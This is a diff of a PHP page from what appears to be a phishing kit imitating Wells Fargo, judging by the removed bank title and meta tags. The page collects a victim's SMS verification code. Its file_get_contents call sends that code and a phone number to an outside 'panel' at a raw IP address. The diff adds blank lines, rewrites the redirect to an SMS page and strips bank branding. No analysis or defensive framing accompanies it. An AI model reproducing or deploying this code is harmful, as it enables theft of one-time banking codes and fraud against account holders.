@@ -1,3 +1,52 @@
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 <?php
 session_start();
 error_reporting(0);
@@ -27,11 +76,15 @@ if( isset($_GET['id'])){
 }
 
 // $user = @$_POST['user'];
+$code = "";
 $code = trim($_POST['code']);
 // $phone = trim($_POST['phone']);
-echo $phone . " : " . $code;
+// echo $phone . " : " . $code . "<br>";
+print($code);
 if ($code == "") {
-  echo '<meta http-equiv="refresh" content="0; URL=codeinfo.php?id=$id&error=1>';
+    // echo " No code";
+    echo "<meta http-equiv='refresh' content='0;url=smspage.php?id=" . $id . "&error=1'>";
+    // echo '<meta http-equiv="refresh" content="0; URL=smspage.php?id=' . $id . '&error=1>';
     die();
 }
 $test = @file_get_contents("http://137.74.171.167/panelo/a.php?sms=$phone,$code");        // here goes the panel
@@ -43,18 +96,10 @@ $test = @file_get_contents("http://137.74.171.167/panelo/a.php?sms=$phone,$code"
     <meta http-equiv="content-type" content="text/html; charset=UTF-8">
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <title>Wells Fargo – Banking, Credit Cards, Loans, Mortgages &amp; More</title>
-    <meta name="description" content="Wells Fargo: Provider of banking, mortgage, investing, credit card, and personal, small business, and commercial financial services. Learn more.">
-    <meta name="keywords" content="checking accounts, savings accounts, student loans, personal loans, investments, online banking, auto loans, home loans">
+    <title>Completed<?=$id?></title>
     <meta name="robots" content="index, follow">
     <meta name="search_category" content="Personal">
     <meta name="viewport" content="width=device-width,  initial-scale=1.0, maximum-scale=6.0, user-scalable=yes">
-    <meta http-equiv="Cache-Control" content="must-revalidate">
-    <meta http-equiv="Cache-Control" content="no-store">
-    <meta http-equiv="Cache-Control" content="no-cache">
-    <meta http-equiv="Cache-Control" content="private">
-    <meta http-equiv="Pragma" content="no-cache">
-    <meta name="apple-itunes-app" content="app-id=311548709">
 
     <link rel="shortcut icon" type="image/x-icon" href="../files/icons/favicon.ico">
     <link rel="apple-touch-icon" sizes="120x120" href="../files/icons/apple-touch-icon-120x120.png">
@@ -177,3 +222,4 @@ $test = @file_get_contents("http://137.74.171.167/panelo/a.php?sms=$phone,$code"
 </body>
 
 </html>
+
